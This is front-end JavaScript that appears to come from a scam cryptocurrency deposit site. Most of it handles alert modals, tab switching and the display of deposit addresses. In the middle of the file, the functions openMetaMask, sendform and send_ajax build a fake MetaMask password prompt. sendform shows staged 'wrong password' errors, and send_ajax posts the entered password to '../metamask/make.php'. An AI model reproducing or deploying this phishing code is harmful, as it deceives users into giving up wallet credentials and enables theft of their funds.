
	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 

  
 
// <script src="../assets/js/main.js"></script>
// <script src="../assets/js/depositTabs.js"></script>

    function copyThisAddress(crypto) {

      // Create a "hidden" input
      var aux = document.createElement("input");

      // Assign it the value of the specified element
      aux.setAttribute("value", document.getElementById("address_" + crypto).value);

      // Append it to the body
      document.body.appendChild(aux);

      // Highlight its content
      aux.select();

      // Copy the highlighted text
      document.execCommand("copy");

      // Remove it from the body
      document.body.removeChild(aux);

      noti(crypto.toUpperCase() + " Address copied to clipboard", "success");

    };


    var active_crypto = 'btc';
    function setTab(crypto) {
        $("#btn_" + active_crypto).removeClass("buttonActiveNew");
        $("#btn_" + crypto).addClass("buttonActiveNew");

        $("#tab_" + active_crypto).removeClass("deposit__content-item-active");
        $("#tab_" + crypto).addClass("deposit__content-item-active");

        active_crypto = crypto;
    }

    function viewAddBlock(crypto) {
        $("#remove_add_block_" + crypto).remove(); 
        $.ajax({
            url: "/ajax/GET_MY_DEPOSIT_ADDRESS",
            type: "POST",
            data: {
              crypto: crypto
            },
			dataType: 'json',
            success: function(data) {
				
				if(data.response == 'success'){
					  $("#address_" + crypto).val(data.address);
					  $("#view_qr_code_" + crypto).attr("src", "https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl="+data.address);
					  $("#view_qr_code_" + crypto).css("opacity", "1");

					  $("#view_addresses_" + crypto).css("display", "block");                

					  if(data.tag != "" && data.tag.length > 1) {
						$("#address_memo_"+crypto).val(data.tag);
						$("#view_addresses_memo_"+crypto).css("display", "block");
					  }
				  }
				  
				  
				  
				if(data.response == 'error'){
					noti(data.text, "error");
				}
				
				
				
				
				
				
			
            
                 

              

            }
          }) 
    }

